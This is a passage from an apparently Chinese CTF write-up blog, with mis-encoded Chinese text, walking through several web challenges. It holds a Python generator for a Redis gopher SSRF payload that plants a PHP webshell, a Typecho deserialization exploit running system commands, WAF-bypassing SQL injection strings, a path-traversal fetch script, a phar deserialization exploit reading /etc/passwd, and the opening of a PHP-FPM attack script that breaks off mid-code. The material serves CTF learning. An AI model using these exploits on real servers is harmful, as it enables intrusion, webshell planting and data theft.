class="string">"/var/www/html"</span></span><br><span class="line"></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line"></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line"></span><br><span class="line">     <span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line"></span><br><span class="line">     <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line"></span><br><span class="line">     <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line"></span><br><span class="line">     <span class="string">"save"</span></span><br><span class="line"></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.quote(redis_format(x))</span><br><span class="line">    <span class="keyword">print</span> payload</span><br><span class="line"><span class="comment">#########################################################################################</span></span><br><span class="line">gopher://<span class="number">173.235</span><span class="number">.107</span><span class="number">.11</span>:<span class="number">6379</span>/_%<span class="number">2</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">248</span>%<span class="number">0</span>D%<span class="number">0</span>Aflushall%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A3%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">241</span>%<span class="number">0</span>D%<span class="number">0</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2432</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>Fphp%<span class="number">20</span>system%<span class="number">28</span>%<span class="number">22</span>cat%<span class="number">20</span>/flag%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A4%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Adir%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2413</span>%<span class="number">0</span>D%<span class="number">0</span>A/var/www/html%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A4%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2410</span>%<span class="number">0</span>D%<span class="number">0</span>Adbfilename%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">249</span>%<span class="number">0</span>D%<span class="number">0</span>Ashell.php%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">244</span>%<span class="number">0</span>D%<span class="number">0</span>Asave%<span class="number">0</span>D%<span class="number">0</span>A</span><br></pre></td></tr></table></figure>

<p>è·‘å‡ºæ¥çš„æ‰“ä¸Šå»ï¼Œå†è®¿é—®shell.phpå³å¯getflag</p>
<h4 id="GKCTF2020-EZä¸‰å‰‘å®¢-EzTypecho"><a href="#GKCTF2020-EZä¸‰å‰‘å®¢-EzTypecho" class="headerlink" title="[GKCTF2020]EZä¸‰å‰‘å®¢-EzTypecho"></a>[GKCTF2020]EZä¸‰å‰‘å®¢-EzTypecho</h4><p>ä¸‹è½½æºç ï¼Œæ‰¾åˆ°åˆ©ç”¨çš„ç‚¹ï¼Œåœ¨start</p>
<img src="/2020/05/24/GKCTF/7.png" class="">

<p>typechoååºåˆ—åŒ–ï¼Œgoogleä¸€ä¸‹ï¼Œæ‰¾åˆ°exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_type;</span><br><span class="line">    <span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type = <span class="string">"RSS 2.0"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">"title"</span> =&gt; <span class="string">"test"</span>,</span><br><span class="line">                <span class="string">"link"</span> =&gt; <span class="string">"test"</span>,</span><br><span class="line">                <span class="string">"data"</span> =&gt; <span class="string">"20190430"</span>,</span><br><span class="line">                <span class="string">"author"</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">            ),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">"screenName"</span> =&gt; <span class="string">"eval('system(\'cat /flag\');exit;')"</span>,</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>(<span class="string">"assert"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Typecho_Feed();</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"adapter"</span> =&gt; $a,</span><br><span class="line">    <span class="string">"prefix"</span> =&gt; <span class="string">"test"</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($c));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo0OntzOjU6InRpdGxlIjtzOjQ6InRlc3QiO3M6NDoibGluayI7czo0OiJ0ZXN0IjtzOjQ6ImRhdGEiO3M6ODoiMjAxOTA0MzAiO3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjM1OiJldmFsKCdzeXN0ZW0oXCdjYXQgL2ZsYWdcJyk7ZXhpdDsnKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NDoidGVzdCI7fQ==</span></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥æ‰“cookieè¿‡å»æˆ–è€…postï¼Œæ”¹ä¸€ä¸‹refererï¼Œgetflag</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h4 id="GKCTF2020-å°å­¦ç”Ÿçš„å¯†ç å­¦"><a href="#GKCTF2020-å°å­¦ç”Ÿçš„å¯†ç å­¦" class="headerlink" title="[GKCTF2020]å°å­¦ç”Ÿçš„å¯†ç å­¦"></a>[GKCTF2020]å°å­¦ç”Ÿçš„å¯†ç å­¦</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e(x)=<span class="number">11</span>x+<span class="number">6</span>(mod26)</span><br><span class="line">å¯†æ–‡ï¼šwelcylk</span><br></pre></td></tr></table></figure>

<p>ä»¿å°„å¯†ç ï¼Œç›´æ¥è„šæœ¬è§£å¯†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k = a //b</span><br><span class="line">        remainder = a % b</span><br><span class="line">        x1, y1 = get(b, remainder)</span><br><span class="line">        x, y =y1, x1 - k * y1</span><br><span class="line">    <span class="keyword">return</span> x, y</span><br><span class="line">s = input(<span class="string">"è¯·è¾“å…¥è§£å¯†å­—ç¬¦ï¼š"</span>).upper()</span><br><span class="line">a = int(input(<span class="string">"è¯·è¾“å…¥aï¼š"</span>))</span><br><span class="line">b = int(input(<span class="string">"è¯·è¾“å…¥bï¼š"</span>))</span><br><span class="line"><span class="comment">#æ±‚aå…³äº26çš„ä¹˜æ³•é€†å…ƒ</span></span><br><span class="line">x, y = get(a, <span class="number">26</span>)</span><br><span class="line">a1 = x % <span class="number">26</span></span><br><span class="line">l= len(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(l):</span><br><span class="line">    cipher = a1 * (ord(s[i])- <span class="number">65</span> - b) % <span class="number">26</span></span><br><span class="line">    res=chr(cipher + <span class="number">65</span>)</span><br><span class="line">    print(res, end=<span class="string">''</span>)</span><br><span class="line">    <span class="comment">#sorceryï¼ˆè§£å¯†å­—ç¬¦ï¼‰</span></span><br></pre></td></tr></table></figure>

<p>sorceryç”¨base64åŠ å¯†åŒ…ä¸Šflagå³å¯</p>
<h4 id="GKCTF2020-æ±‰å­—çš„ç§˜å¯†"><a href="#GKCTF2020-æ±‰å­—çš„ç§˜å¯†" class="headerlink" title="[GKCTF2020]æ±‰å­—çš„ç§˜å¯†"></a>[GKCTF2020]æ±‰å­—çš„ç§˜å¯†</h4><p>å½“é“ºå¯†ç +asciiè½¬å­—ç¬¦</p>
<p>å­—ç¬¦æŒ¨ä¸ª+ä¸‹æ ‡ä½ç½®å³ä¸ºflag</p>
]]></content>
      <tags>
        <tag>GKï¼ï¼</tag>
      </tags>
  </entry>
  <entry>
    <title>DSAJuly</title>
    <url>/2020/07/31/DSAJuly/</url>
    <content><![CDATA[<p>å®‰æ’æœˆèµ›ï¼Œå°±åšå‡ºäº†ä¸€ä¸ªWEBï¼Œèµ›åå¤ç°ï¼Œå­¦ä¹ SQLæ— åˆ—åæ³¨å…¥ï¼Œä»¥åŠç­‰ä»·æ›¿æ¢çš„æ•°æ®åº“<a id="more"></a></p>
<h2 id="SQLI"><a href="#SQLI" class="headerlink" title="SQLI"></a>SQLI</h2><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul>
<li>bypassinfomation_schema(sys.schema_table_statistics_with_buffer/sys.x$schema_table_statistics_with_buffer/mysql.innodb_table_stats)</li>
<li>sys.schema_tables_with_full_table_scans</li>
<li>æ— åˆ—åæ³¨å…¥</li>
</ul>
<h3 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>æ‰“å¼€é¢˜ç›®è¦ä¼ å…¥id</p>
<p>å°è¯•è”åˆæŸ¥è¯¢ï¼Œè¿”å›äº†WAF</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/;|benchmark|\^|if|[\s]|in|case|when|sleep|auto|desc|stat|\||lock|or|and|&amp;|like|-|`/i"</span>, $id);</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°è¢«è¿‡æ»¤çš„å…³é”®è¯ï¼Œinformation_schemaä¸èƒ½ç”¨äº†ï¼Œç„¶åå½“æ—¶æƒ³åˆ°äº†èƒ½æ›¿æ¢çš„åº“ï¼Œä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆæ‰¾</p>
<p>è¿™é‡Œstatè¢«è¿‡æ»¤è¯´æ˜ä¸‹é¢çš„åº“ä¹Ÿéƒ½ä¸èƒ½ç”¨äº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(sys.schema_table_statistics_with_buffer&#x2F;sys.x$schema_table_statistics_with_buffer&#x2F;mysql.innodb_table_stats)</span><br></pre></td></tr></table></figure>

<p>èµ›åçœ‹wpè¿˜æœ‰ä¸€ä¸ªåº“sys.schema_tables_with_full_table_scans</p>
<p>æŸ¥ä¸€ä¸‹è¡¨å</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=0'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">group_concat</span>(object_name),<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_tables_with_full_table_scans%<span class="number">23</span></span><br><span class="line"><span class="comment">#users,flllaaaggg,sys_config</span></span><br></pre></td></tr></table></figure>

<img src="/2020/07/31/DSAJuly/1.png" class="">

<p>ä¸‹é¢å°±æ˜¯è¦è¿›è¡Œæ— åˆ—åæ³¨å…¥</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=0'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span>a<span class="number">.2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>*<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flllaaaggg)a<span class="comment">/**/</span><span class="keyword">limit</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">1</span>),<span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<img src="/2020/07/31/DSAJuly/2.png" class="">

<h2 id="Ezfileincude"><a href="#Ezfileincude" class="headerlink" title="Ezfileincude"></a>Ezfileincude</h2><h3 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul>
<li>Unixæ—¶é—´æˆ³</li>
<li>æ–‡ä»¶åŒ…å«</li>
<li>ç›®å½•ç©¿è¶Š</li>
</ul>
<h3 id="è§£é¢˜æ­¥éª¤-1"><a href="#è§£é¢˜æ­¥éª¤-1" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€é¢˜å¾—åˆ°ä¸€å¼ å›¾ç‰‡</p>
<img src="/2020/07/31/DSAJuly/3.png" class="">

<p>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°å¯ä»¥ç‚¹å‡»çš„åœ°å€</p>
<img src="/2020/07/31/DSAJuly/4.png" class="">

<p>å¯ä»¥å‘ç°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯æ—¶é—´æˆ³ä¸€ä¸ªæ˜¯base64åŠ å¯†åçš„æ–‡ä»¶åï¼Œè§£ç ä¸€ä¸‹æ˜¯gpa.png</p>
<p>åˆ·æ–°ä¸€ä¸‹ä¼šå‘ç°æç¤ºï¼šwhatâ€™s your time?</p>
<p>è¯´æ˜æ—¶é—´è¦ä¿æŒæœ€æ–°ï¼Œç›´æ¥ç›®å½•ç©¿è¶Š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure>

<p>ç„¶åbase64åŠ å¯†ä¸€ä¸‹ä¼ ç»™fï¼Œtè¦æ›´æ–°åˆ°æœ€æ–°</p>
<img src="/2020/07/31/DSAJuly/5.png" class="">

<p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨åŠè‡ªåŠ¨åŒ–è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">t = int(time.time())</span><br><span class="line">f = <span class="string">'gqy.jpg?../../../../../../flag'</span></span><br><span class="line">f = base64.b64encode(f.encode()).decode()</span><br><span class="line">print(t, f)</span><br><span class="line">host = <span class="string">'http://183.129.189.60:10009/image.php?t=&#123;&#125;&amp;f=&#123;&#125;'</span>.format(t, f)</span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0)'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url=host, headers=head)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<p>é¡ºåˆ©æ‹¿åˆ°flag</p>
<img src="/2020/07/31/DSAJuly/6.png" class="">

]]></content>
      <tags>
        <tag>DAS</tag>
      </tags>
  </entry>
  <entry>
    <title>NCTF2019-phar-matches-everything</title>
    <url>/2020/07/30/NCTF2019-phar-matches-everything/</url>
    <content><![CDATA[<h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹<a id="more"></a></h2><ul>
<li>vimçš„swpæ¢å¤æ–‡ä»¶</li>
<li>pharååºåˆ—åŒ–</li>
<li>protectedå±æ€§ä¸publicå±æ€§åºåˆ—åŒ–åŒºåˆ«</li>
<li>ç”Ÿæˆæ”»å‡»PHP-FPMçš„TCPæ•°æ®æµçš„è„šæœ¬</li>
<li>gopheræ‰“PHP-FPM</li>
</ul>
<h2 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h2><p>æ‰“å¼€é¢˜ç›®ï¼Œèƒ½å¤Ÿä¸Šä¼ æ–‡ä»¶ï¼Œé¢˜ç›®å°±æ˜¯pharï¼Œé‚£è‚¯å®šä¸pharååºåˆ—åŒ–æœ‰å…³</p>
<p>æ‰«æç›®å½•ï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆéšè—æ–‡ä»¶ï¼Œçœ‹äº†wpè¯´æ˜¯ç”¨.swpæ¢å¤ï¼Œä½†æ˜¯è¯•çš„æ—¶å€™æ²¡æ¢å¤å‡ºæ¥ï¼Œç›´æ¥GitHubæ‹¿ä¸‹äº†æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $test;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">funny_get</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">        $ch = curl_init();  </span><br><span class="line">        curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">        curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line">        $output=curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $this_is_a_easy_test=unserialize($_GET[<span class="string">'careful'</span>]);</span><br><span class="line">        <span class="keyword">if</span>($this_is_a_easy_test-&gt;funny_get() === <span class="string">'1'</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;curl(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">    $check = getimagesize($_POST[<span class="string">'name'</span>]);</span><br><span class="line">    <span class="keyword">if</span>($check !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is an image - "</span> . $check[<span class="string">"mime"</span>] . <span class="string">"."</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is not an image."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¦ç»•è¿‡getimagesizeçš„éªŒè¯ï¼ŒåŠ ä¸ŠGIF89aï¼Œè¿™é‡Œè¿˜è¦è®©Easytestç±»ä¸­çš„$test===â€˜1â€™ï¼Œç„¶åå°±å¯ä»¥åˆ©ç”¨curlæ¥è¯»å–æ–‡ä»¶å†…å®¹</p>
<p>ä¸‹é¢å°±æ˜¯å†™ä¸€ä¸ªpharååºåˆ—åŒ–çš„expæ¥éªŒè¯ä¸€ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $test = <span class="string">'1'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $url =<span class="string">'file:///etc/passwd'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Easytest();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line">$b = <span class="keyword">new</span> Main();</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">'GIF89a'</span> . <span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($b);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç›´æ¥å¯¹åºåˆ—åŒ–çš„æ•°æ®è¿›è¡Œurlç¼–ç ï¼Œç»è¿‡æµ‹è¯•éœ€è¦ç¼–ç </p>
<p>å°†æœ¬åœ°ç”Ÿæˆçš„pharæ–‡ä»¶åç¼€ä¿®æ”¹æˆgifï¼Œä¸Šä¼ ï¼Œç„¶åè®¿é—®</p>
<img src="/2020/07/30/NCTF2019-phar-matches-everything/1.png" class="">

<p>ä¸çŸ¥é“æ˜¯æ€ä¹ˆçœ‹å‡ºæ‰“å†…ç½‘çš„ï¼Œå…ˆè·Ÿç€ç»§ç»­</p>
<p>æ”¹å˜urlè¯»å–/etc/hosts</p>
<img src="/2020/07/30/NCTF2019-phar-matches-everything/2.png" class="">

<p>æˆåŠŸè¯»å–åˆ°äº†ä¸€å°ä¸»æœºåœ°å€173.111.147.10</p>
<img src="/2020/07/30/NCTF2019-phar-matches-everything/3.png" class="">

<p>ç”¨httpåè®®è®¿é—®ä¸€ä¸‹è¯¥ç½‘å€ï¼Œå‘ç°å°±æ˜¯è¿™ä¸ªé¡µé¢</p>
<img src="/2020/07/30/NCTF2019-phar-matches-everything/4.png" class="">

<p>æ ¹æ®ä¹‹å‰buuåšé¢˜ç»éªŒï¼Œåº”è¯¥æ˜¯ä¸‹ä¸€å°173.111.147.11ï¼Œè®¿é—®ä¸€ä¸‹</p>
<img src="/2020/07/30/NCTF2019-phar-matches-everything/5.png" class="">

<p>æœç„¶æ˜¯è¿™æ ·ï¼Œè¿˜æœ‰æç¤ºæ˜¯è·ŸPHP-FPMç›¸å…³ï¼Œä¸‹é¢å°±æ˜¯ssrf+gopheræ‰“fpmï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹phpinfo();,ä¸‹é¢æ˜¯ç”ŸæˆTCPæ•°æ®æµçš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(chr(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span><span class="params">(c)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(c, int):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> ord(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> issubclass(type(s), str):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        s = str(s, <span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = str(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">"""A Fast-CGI Client for Python"""</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span 